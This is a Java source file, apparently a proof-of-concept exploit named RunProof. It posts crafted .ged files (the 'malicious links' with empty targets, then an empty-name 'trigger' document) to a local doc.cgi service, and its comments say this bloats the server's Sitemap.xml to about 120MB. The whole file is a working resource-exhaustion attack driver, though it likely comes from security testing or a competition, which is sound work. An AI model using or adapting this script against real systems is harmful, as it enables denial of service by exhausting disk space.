/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package infotraderproof;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;

/**
 *
 * @author user
 */
public class RunProof {

    public static void main(String[] args) throws IOException {

        String readFile = null;

        //Add a series of files with empty links. Each one exponentially increases the size of the output
        readFile = readFile("spaceattackdata/blankjedilink.ged");
        doPost(readFile);
        System.out.println("Adding a malicious link (links to empty string)-- no Sitemap.xml size modification should happen yet");

        readFile = readFile("spaceattackdata/blankmsftlink.ged");
        doPost(readFile);
        System.out.println("Adding another malicious link -- no Sitemap.xml size modification should happen yet");

        
        readFile = readFile("spaceattackdata/blankemerlink.ged");
        doPost(readFile);
        System.out.println("Adding another malicious link -- no Sitemap.xml size modification should happen yet");


        readFile = readFile("spaceattackdata/blankenerlink.ged");
        doPost(readFile);
        System.out.println("Adding another malicious link -- no Sitemap.xml size modification should happen yet");

        //Add the trigger: A file with an empty name
        System.out.println("\n\nCalling the trigger -- a doc with an empty name field -- after this completes"
                + " the Sitemap.xml will be ~120MB");

        readFile = readFile("spaceattackdata/blankdocname.ged");
        doPost(readFile);
        System.out.println("Done -- Sitemap should be ~120MB big now");

    }

    

    public static void doPost(String rawData) throws MalformedURLException, IOException {
        Date starttime = null;
        {
            Calendar cal = Calendar.getInstance();
            SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss");
            String reqdate = sdf.format(cal.getTime());
            starttime = cal.getTime();
            //System.out.println(reqdate);
        }
        
        String POST_URL = "http://127.0.0.1:8988/doc.cgi";
        String USER_AGENT = "Mozilla/5.0";
        String encodedData = URLEncoder.encode(rawData, StandardCharsets.UTF_8.name());
        String POST_PARAMS = encodedData;//"userName=Pankaj";       

        URL obj = new URL(POST_URL);
        HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("User-Agent", USER_AGENT);

        // For POST only - START
        conn.setDoOutput(true);
        OutputStream os = conn.getOutputStream();
        os.write(POST_PARAMS.getBytes());
        os.flush();
        os.close();
        // For POST only - END

        int responseCode = conn.getResponseCode();
        System.out.println("POST Response Code :: " + responseCode);

        if (responseCode == HttpURLConnection.HTTP_OK) { //success
            BufferedReader in = new BufferedReader(new InputStreamReader(
                    conn.getInputStream()));
            String inputLine;
            StringBuffer response = new StringBuffer();

            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();

            // print result
            System.out.println(response.toString());

        } else {
            System.out.println("POST request not worked");
        }
        Date endtime;
        {
            Calendar cal = Calendar.getInstance();
            SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss");
            String reqdate = sdf.format(cal.getTime());
             endtime = cal.getTime();
            //System.out.println(reqdate);
        }
        long stime = starttime.getTime();
        long etime = endtime.getTime();
        long diff = etime-stime;
        System.out.println("number of seconds: "+(diff/1000));
        
    }

    private static String readFile(String file) throws IOException {
        BufferedReader reader = new BufferedReader(new FileReader(file));
        String line = null;
        StringBuilder stringBuilder = new StringBuilder();
        String ls = System.getProperty("line.separator");

        try {
            while ((line = reader.readLine()) != null) {
                stringBuilder.append(line);
                stringBuilder.append(ls);
            }

            return stringBuilder.toString();
        } finally {
            reader.close();
        }
    }

}
